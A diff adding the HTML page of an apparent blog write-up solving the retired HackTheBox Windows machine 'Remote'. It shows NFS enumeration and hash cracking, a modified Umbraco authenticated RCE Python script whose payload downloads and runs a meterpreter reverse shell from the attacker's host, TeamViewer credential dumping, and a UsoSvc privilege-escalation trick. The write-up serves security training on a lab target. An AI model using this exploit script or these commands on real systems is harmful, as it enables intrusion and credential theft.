@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Remote | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2020/11/htb-remote.html" title="Read more" class="entry-title-link">
+                HTB: Remote</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2020-11-10T20:50:00+01:00">10 Nov 2020</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/htb.html" title="Read more with the label HTB" class="meta-link">HTB</a> 
+          <a href="../../tag/windows.html" title="Read more with the label windows" class="meta-link">windows</a> 
+          <a href="../../tag/umbraco.html" title="Read more with the label umbraco" class="meta-link">umbraco</a> 
+          <a href="../../tag/teamviewer.html" title="Read more with the label teamviewer" class="meta-link">teamviewer</a> 
+          <a href="../../tag/metasploit.html" title="Read more with the label metasploit" class="meta-link">metasploit</a> 
+          <a href="../../tag/msfvenom.html" title="Read more with the label msfvenom" class="meta-link">msfvenom</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 9 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left" src="/media/2020.11/remote_card.png" alt="Remote card" width="262"></p>
+<p>This is a writeup about a retired HacktheBox machine:
+<a href="https://www.hackthebox.eu/home/machines/profile/234">Remote</a> published by
+<a href="https://www.hackthebox.eu/home/users/profile/2984">mrb3n</a> on Mars the 21th 2020.
+This box is a Windows machine classified as easy. It implies a NFS share, a
+vulnerable CMS, TeamViewer and a second unintended way towards root.</p>
+
+
+<h1 id="initial-foothold">Initial foothold</h1>
+<p>We start with an nmap scan. 10 ports are open.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code># Nmap 7.80 scan initiated Thu Mar 26 10:51:40 2020 as: nmap -sS -oN nmap2 --top-ports=10000 -sV 10.10.10.180</span>
+<span class="code-line">Nmap scan report for 10.10.10.180</span>
+<span class="code-line">Host is up (0.30s latency).</span>
+<span class="code-line">Not shown: 8310 closed ports</span>
+<span class="code-line">PORT      STATE SERVICE       VERSION</span>
+<span class="code-line">21/tcp    open  ftp           Microsoft ftpd</span>
+<span class="code-line">80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">111/tcp   open  rpcbind       2-4 (RPC #100000)</span>
+<span class="code-line">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="code-line">445/tcp   open  microsoft-ds?</span>
+<span class="code-line">2049/tcp  open  mountd        1-3 (RPC #100005)</span>
+<span class="code-line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="code-line">49678/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="code-line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line"># Nmap done at Thu Mar 26 11:02:07 2020 -- 1 IP address (1 host up) scanned in 626.37 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>For each port we will look what service is running an how we can enumerate them:</p>
+<ul>
+<li>Port 21: FTP, <strong>we will dig it more</strong></li>
+<li>Port 80: A website, <strong>we will dig it more</strong></li>
+<li>Port 111: rpcbind, nothing here</li>
+<li>Port 135: MS Windows RPC, nothing here</li>
+<li>Port 139 and 445: SMB, <strong>we will dig it more</strong></li>
+<li>Port 2049: NFS, <strong>we will dig it more</strong></li>
+<li>Port 5985: some HTTP service but nothing available</li>
+<li>Port 47001: some HTTP service but nothing available</li>
+<li>Port 49678: MS Windows RPC, nothing here</li>
+</ul>
+<h2 id="ftp">FTP</h2>
+<p>We try to connect to the FTP using an anonymous connection. At this time (Mars
+27th 2020) Firefox still support this protocol. But there is no file available
+with the anonymous account.</p>
+<p><img alt="anonymous FTP" src="/media/2020.11/remote_02.png"></p>
+<h2 id="smb">SMB</h2>
+<p>We try to enumerate the SMB share and users using the metasploit modules
+<code>auxiliary/scanner/smb/smb_enumshares</code> and
+<code>auxiliary/scanner/smb/smb_enumshares</code> but there is nothing interesting here.</p>
+<h2 id="web">Web</h2>
+<p>The home page is about selling products. We quickly browse the website but
+nothing really pop out.</p>
+<p><img alt="Website homepage" src="/media/2020.11/remote_04.png"></p>
+<p>We run <a href="https://github.com/ffuf/ffuf">fuff</a> a <code>Go</code> equivalent of <code>dirb</code> with the
+<code>big.txt</code> wordlist from dirb. This allow us to found the "umbraco" login page.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ ./ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.180/FUZZ -mc 200 -c -v</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">[Status: 200, Size: 4040, Words: 710, Lines: 96]</span>
+<span class="code-line">| URL | http://10.10.10.180/umbraco</span>
+<span class="code-line"></code></pre></div>
+
+<p><img alt="Umbraco login page" src="/media/2020.11/remote_01.png"></p>
+<p>There is a few exploits for this CMS but we do not have any credentials to login.</p>
+<h2 id="nfs">NFS</h2>
+<p>We enumerate the NFS share using the <code>auxiliary/scanner/nfs/nfsmount</code> metasploit
+module. We found that the share <code>/site_backups</code> is exposed.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>msf5 &gt; use auxiliary/scanner/nfs/nfsmount</span>
+<span class="code-line">msf5 auxiliary(scanner/nfs/nfsmount) &gt; set RhOSTS 10.10.10.180</span>
+<span class="code-line">RhOSTS =&gt; 10.10.10.180</span>
+<span class="code-line">msf5 auxiliary(scanner/nfs/nfsmount) &gt; run</span>
+<span class="code-line"></span>
+<span class="code-line">[+] 10.10.10.180:111      - 10.10.10.180 NFS Export: /site_backups []</span>
+<span class="code-line">[*] 10.10.10.180:111      - Scanned 1 of 1 hosts (100% complete)</span>
+<span class="code-line">[*] Auxiliary module execution completed</span>
+<span class="code-line"></code></pre></div>
+
+<p>We mount the share in a temporary folder using <code>mount</code>. A few Google search lead
+us to the <a href="https://our.umbraco.com/forum/umbraco-8/96468-umbraco-8-database-file">umbraco configuration file</a>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ mkdir /tmp/nfs</span>
+<span class="code-line">$ mount -t nfs 10.10.10.180:/site_backups /tmp/nfs -nolock</span>
+<span class="code-line">$ cd /tmp/nfs/</span>
+<span class="code-line">$ ls</span>
+<span class="code-line">App_Browsers  App_Data  App_Plugins  aspnet_client  bin  Config  css  default.aspx  Global.asax  Media  scripts  Umbraco  Umbraco_Client  Views  Web.config</span>
+<span class="code-line">$ ls App_Data</span>
+<span class="code-line">cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf</span>
+<span class="code-line"></code></pre></div>
+
+<p>We copy it on our local folder and run <code>string</code> on it. The password hash for the
+account "admin@htb.local’ is in the first lines.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>strings ~/pentest/htb_remote/Umbraco.sdf  | less</span>
+<span class="code-line">Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d</span>
+<span class="code-line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50</span>
+<span class="code-line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{&quot;hashAlgorithm&quot;:&quot;SHA1&quot;}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f</span>
+<span class="code-line">smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e</span>
+<span class="code-line">ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749</span>
+<span class="code-line">ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={&quot;hashAlgorithm&quot;:&quot;HMACSHA256&quot;}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32</span>
+<span class="code-line"></code></pre></div>
+
+<p>We run John the ripper with the Rockyou word list against the hash and found the
+password "baconandcheese".</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ john hash -w=tools/password_lists/rockyou.txt</span>
+<span class="code-line">Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])</span>
+<span class="code-line">Warning: no OpenMP support for this hash type, consider --fork=4</span>
+<span class="code-line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span>
+<span class="code-line">baconandcheese   (?)</span>
+<span class="code-line"></code></pre></div>
+
+<p>The credentials admin@htb.local:baconandcheese allow us ton connect to the
+Umbraco interface.</p>
+<p><img alt="Umbraco admin interface" src="/media/2020.11/remote_05.png"></p>
+<h2 id="exploiting-umbraco">Exploiting Umbraco</h2>
+<p>As previously mentioned there is a few exploit for Umbraco.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>$ searchsploit umbraco</span>
+<span class="code-line">--------------------------------------- ----------------------------------------</span>
+<span class="code-line">Exploit Title                         |  Path</span>
+<span class="code-line">                                      | (/usr/share/exploitdb/)</span>
+<span class="code-line">--------------------------------------- ----------------------------------------</span>
+<span class="code-line">Umbraco CMS - Remote Command Execution | exploits/windows/webapps/19671.rb</span>
+<span class="code-line">Umbraco CMS 7.12.4 - (Authenticated) R | exploits/aspx/webapps/46153.py</span>
+<span class="code-line">Umbraco CMS SeoChecker Plugin 1.9.2 -  | exploits/php/webapps/44988.txt</span>
+<span class="code-line">--------------------------------------- ----------------------------------------</span>
+<span class="code-line">Shellcodes: No Result</span>
+<span class="code-line">Papers: No Result</span>
+<span class="code-line"></code></pre></div>
+
+<p>We want to use "Umbraco CMS 7.12.4 - (Authenticated) Remote code execution". We
+get the script from our local exploitdb. Looking at the POC, it is launching a
+<code>calc.exe</code> on the server. We try it to see if we get an error.</p>
+<p>As there is no error we modifiy it to obtain a reverse shell:
+  * we use msfvenom to create a meterpreter: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; -f exe &gt;reverse.exe</code>
+  * we run a python simple HTTP server to share the executable
+  * we run metasploit multi handler
+  * Using <code>powershell</code> we download the executable binary and run it</p>
+<p>The script is the following:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="kn">import</span> <span class="nn">requests</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">def</span> <span class="nf">print_dict</span><span class="p">(</span><span class="n">dico</span><span class="p">):</span></span>
+<span class="code-line">    <span class="nb">print</span><span class="p">(</span><span class="n">dico</span><span class="o">.</span><span class="n">items</span><span class="p">());</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Start&quot;</span><span class="p">);</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="c1"># Execute a calc for the PoC</span></span>
+<span class="code-line"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;&lt;?xml version=&quot;1.0&quot;?&gt;&lt;xsl:stylesheet version=&quot;1.0&quot; </span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">xmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot; xmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot; </span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">xmlns:csharp_user=&quot;http://csharp.mycompany.com/mynamespace&quot;&gt;</span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;csharp_user&quot;&gt;public string xml() </span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">{ string cmd = &quot;mkdir /tmp;iwr -uri http://10.10.14.80:8081/reverse.exe -outfile /tmp/reverse.exe;/tmp/reverse.exe&quot;; System.Diagnostics.Process proc = new System.Diagnostics.Process();</span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">proc.StartInfo.FileName = &quot;powershell.exe&quot;; proc.StartInfo.Arguments = cmd;</span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; </span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } </span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">&lt;/msxsl:script&gt;&lt;xsl:template match=&quot;/&quot;&gt; &lt;xsl:value-of select=&quot;csharp_user:xml()&quot;/&gt;</span><span class="se">\</span></span>
+<span class="code-line"><span class="s1">&lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; &#39;</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">login</span> <span class="o">=</span> <span class="s2">&quot;admin@htb.local&quot;</span><span class="p">;</span></span>
+<span class="code-line"><span class="n">password</span><span class="o">=</span><span class="s2">&quot;baconandcheese&quot;</span><span class="p">;</span></span>
+<span class="code-line"><span class="n">host</span> <span class="o">=</span> <span class="s2">&quot;http://10.10.10.180&quot;</span><span class="p">;</span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span></span>
+<span class="code-line"><span class="n">url_main</span> <span class="o">=</span><span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/&quot;</span><span class="p">;</span></span>
+<span class="code-line"><span class="n">r1</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_main</span><span class="p">);</span></span>
+<span class="code-line"><span class="n">print_dict</span><span class="p">(</span><span class="n">r1</span><span class="o">.</span><span class="n">cookies</span><span class="p">);</span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">url_login</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/backoffice/UmbracoApi/Authentication/PostLogin&quot;</span><span class="p">;</span></span>
+<span class="code-line"><span class="n">loginfo</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;username&quot;</span><span class="p">:</span><span class="n">login</span><span class="p">,</span><span class="s2">&quot;password&quot;</span><span class="p">:</span><span class="n">password</span><span class="p">};</span></span>
+<span class="code-line"><span class="n">r2</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_login</span><span class="p">,</span><span class="n">json</span><span class="o">=</span><span class="n">loginfo</span><span class="p">);</span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">url_xslt</span> <span class="o">=</span> <span class="n">host</span><span class="o">+</span><span class="s2">&quot;/umbraco/developer/Xslt/xsltVisualize.aspx&quot;</span><span class="p">;</span></span>
+<span class="code-line"><span class="n">r3</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">);</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r3</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">);</span></span>
+<span class="code-line"><span class="n">VIEWSTATE</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;__VIEWSTATE&quot;</span><span class="p">)[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span></span>
+<span class="code-line"><span class="n">VIEWSTATEGENERATOR</span> <span class="o">=</span> <span class="n">soup</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="s2">&quot;__VIEWSTATEGENERATOR&quot;</span><span class="p">)[</span><span class="s1">&#39;value&#39;</span><span class="p">];</span></span>
+<span class="code-line"><span class="n">UMBXSRFTOKEN</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;UMB-XSRF-TOKEN&#39;</span><span class="p">];</span></span>
+<span class="code-line"><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;UMB-XSRF-TOKEN&#39;</span><span class="p">:</span><span class="n">UMBXSRFTOKEN</span><span class="p">};</span></span>
+<span class="code-line"><span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;__EVENTTARGET&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;__EVENTARGUMENT&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;__VIEWSTATE&quot;</span><span class="p">:</span><span class="n">VIEWSTATE</span><span class="p">,</span><span class="s2">&quot;__VIEWSTATEGENERATOR&quot;</span><span class="p">:</span><span class="n">VIEWSTATEGENERATOR</span><span class="p">,</span><span class="s2">&quot;ctl00$body$xsltSelection&quot;</span><span class="p">:</span><span class="n">payload</span><span class="p">,</span><span class="s2">&quot;ctl00$body$contentPicker$ContentIdValue&quot;</span><span class="p">:</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="s2">&quot;ctl00$body$visualizeDo&quot;</span><span class="p">:</span><span class="s2">&quot;Visualize+XSLT&quot;</span><span class="p">};</span></span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">r4</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url_xslt</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">);</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;End&quot;</span><span class="p">);</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>That allow us to get a meterpreter on the box.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; getuid</span>
+<span class="code-line">Server username: IIS APPPOOL\DefaultAppPool</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can then use the meterpeter search function to found the user flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; search -f user.txt</span>
+<span class="code-line">Found 1 result...</span>
+<span class="code-line">    c:\Users\Public\user.txt (34 bytes)</span>
+<span class="code-line">meterpreter &gt; cat &quot;c:\Users\Public\user.txt&quot;</span>
+<span class="code-line">fd2b1f187e6f48be38c224cdcb61faf5</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="getting-root">Getting Root</h1>
+<h2 id="teamviewer-way">TeamViewer way</h2>
+<p>We run simple <code>ps</code> on the system to list the process.
+We easily spot the TeamViewer process.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; ps</span>
+<span class="code-line">&lt;SNIP&gt;</span>
+<span class="code-line">2852  628   svchost.exe</span>
+<span class="code-line">2860  628   svchost.exe</span>
+<span class="code-line">2884  628   svchost.exe</span>
+<span class="code-line">2936  628   svchost.exe</span>
+<span class="code-line">2944  628   TeamViewer_Service.exe</span>
+<span class="code-line"></code></pre></div>
+
+<p>A few Google search lead us to a metasploit post module to retrieve TeamViewer passwords</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>meterpreter &gt; run post/windows/gather/credentials/teamviewer_passwords</span>
+<span class="code-line"></span>
+<span class="code-line">[*] Finding TeamViewer Passwords on REMOTE</span>
+<span class="code-line">[+] Found Unattended Password: !R3m0te!</span>
+<span class="code-line"></code></pre></div>
+
+<p>I struggle a lot there trying to connect to the TeamViewer session.
+First I looted the TeamViewer ID in
+<code>C:\Program Files (x86)\TeamViewer\Version7\TeamViewer7_Logfile.log</code> first lines.</p>
+<p>As the box is not connected to the Internet it is not possible to connect using
+the TeamViewer ID.  Therefore I tried to connect localy
+<a href="https://community.teamviewer.com/t5/Knowledge-Base/Can-TeamViewer-be-used-within-a-local-network-LAN-only/ta-p/4618">using directly the IP address</a>
+but this also doesn't work.</p>
+<p><img alt="TeamViewer" src="/media/2020.11/remote_03.png"></p>
+<p>The solution was simpler as this is a simple password reuse. We fire a psexec
+and connect as administrator using
+the TeamViewer password and got a shell as administrator and can easily get
+the root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~/installed_tools/impacket/examples# psexec.py administrator@10.10.10.180</span>
+<span class="code-line">Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation</span>
+<span class="code-line"></span>
+<span class="code-line">Password:</span>
+<span class="code-line">[*] Requesting shares on 10.10.10.180.....</span>
+<span class="code-line">[*] Found writable share ADMIN$</span>
+<span class="code-line">[*] Uploading file AmYWRVZa.exe</span>
+<span class="code-line">[*] Opening SVCManager on 10.10.10.180.....</span>
+<span class="code-line">[*] Creating service PmSN on 10.10.10.180.....</span>
+<span class="code-line">[*] Starting service PmSN.....</span>
+<span class="code-line">[!] Press help for extra shell commands</span>
+<span class="code-line">Microsoft Windows [Version 10.0.17763.107]</span>
+<span class="code-line">(c) 2018 Microsoft Corporation. All rights reserved.</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Windows\system32&gt;cd C:\Users\administrator\Desktop</span>
+<span class="code-line"></span>
+<span class="code-line">C:\Users\Administrator\Desktop&gt;type root.txt</span>
+<span class="code-line">66f9b552d94ea7c55919dc1bfbaff7e1</span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="using-cve-2019-1322">Using CVE-2019-1322</h2>
+<p>There is another unintended method to root this box. This method is not reliable
+as the command to start the Update Orchestrator Service sometime return an error
+(maybe because I used public servers and other players were also starting and stop the service).</p>
+<p>We run <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Windows PEASS</a>
+on the box. The output shows that some patches are missing mostly the one for
+CVE-2019-1322.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>&lt;SNIP&gt;</span>
+<span class="code-line">  [?] Windows vulns search powered by Watson(https://github.com/rasta-mouse/Watson)</span>
+<span class="code-line">    OS Build Number: 17763</span>
+<span class="code-line">      [!] CVE-2019-0836 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://exploit-db.com/exploits/46718</span>
+<span class="code-line">        [&gt;] https://decoder.cloud/2019/04/29/combinig-luafv-postluafvpostreadwrite-race-condition-pe-with-diaghub-collector-exploit-from-standard-user-to-system/</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-0841 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://github.com/rogue-kdc/CVE-2019-0841</span>
+<span class="code-line">        [&gt;] https://rastamouse.me/tags/cve-2019-0841/</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1064 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://www.rythmstick.net/posts/cve-2019-1064/</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1130 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://github.com/S3cur3Th1sSh1t/SharpByeBear</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1253 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://github.com/padovah4ck/CVE-2019-1253</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1315 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://offsec.almond.consulting/windows-error-reporting-arbitrary-file-move-eop.html</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1385 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://www.youtube.com/watch?v=K6gHnr-VkAg</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1388 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://github.com/jas502n/CVE-2019-1388</span>
+<span class="code-line"></span>
+<span class="code-line">      [!] CVE-2019-1405 : VULNERABLE</span>
+<span class="code-line">        [&gt;] https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/</span>
+<span class="code-line"></code></pre></div>
+
+<p>As the <a href="https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/november/cve-2019-1405-and-cve-2019-1322-elevation-to-system-via-the-upnp-device-host-service-and-the-update-orchestrator-service/">article</a>
+precise we can run commands as <code>SYSTEM</code> on the box so we stop the service,
+configure it to copy the root flag in <code>C:\a.txt</code> and start the service again.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>C:\windows\system32\inetsrv&gt;sc.exe stop UsoSvc</span>
+<span class="code-line">sc.exe stop UsoSvc</span>
+<span class="code-line">[SC] ControlService FAILED 1062:</span>
+<span class="code-line"></span>
+<span class="code-line">The service has not been started.</span>
+<span class="code-line"></span>
+<span class="code-line"></span>
+<span class="code-line">C:\windows\system32\inetsrv&gt;sc config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;</span>
+<span class="code-line">sc config UsoSvc binPath=&quot;cmd /c type C:\Users\Administrator\Desktop\root.txt &gt; C:\a.txt&quot;</span>
+<span class="code-line">[SC] ChangeServiceConfig SUCCESS</span>
+<span class="code-line"></span>
+<span class="code-line">C:\windows\system32\inetsrv&gt;sc.exe start UsoSvc</span>
+<span class="code-line">sc.exe start UsoSvc</span>
+<span class="code-line">[SC] StartService FAILED 1053:</span>
+<span class="code-line"></span>
+<span class="code-line">The service did not respond to the start or control request in a timely fashion.</span>
+<span class="code-line"></code></pre></div>
+
+<p>We can now get the root flag.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>C:\windows\system32\inetsrv&gt;type C:\a.txt</span>
+<span class="code-line">type C:\a.txt</span>
+<span class="code-line">66f9b552d94ea7c55919dc1bfbaff7e1</span>
+<span class="code-line"></code></pre></div>
+
+<h1 id="wrapping-up">Wrapping up</h1>
+<p>This box was supposed to be easy. Clearly the root part took me way too long. My
+metasploit was outdated and doesn't had the post module for TeamViewer. And
+after getting the TeamViewer credentials I really tried to connect using the
+solution.</p>
+<p>Nevertheless the box was really interesting.</p>
+    </div>
+
+      <footer>
+          <div>
+            <b>Previous article:</b> <a href="../../2020/10/htb-blunder.html"> HTB: Blunder </a>
+          </div>
+          <div>
+            <b>Next article:</b> <a href="../../2020/11/htb-tabby.html"> HTB: Tabby </a>
+          </div>
+
+<div class="social-buttons">
+
+
+</div>
+      </footer>
+
+
+    <div class="clearfix"></div>
+
+</article>
+<!-- /.entry -->
+            </div>
+        </section>
+
+        <aside class="sidebar pure-u-7-24">
+            <div class="l-box">
+    <section class="module menuitems">
+        <h3 class="title module-title">Menu</h3>
+
+        <ul>
+                <li>
+                    <span class= "icons icons-archives"></span>
+                    <a href="/archives">archives</a>
+                </li>
+                <li>
+                    <span class= "icons icons-feeds"></span>
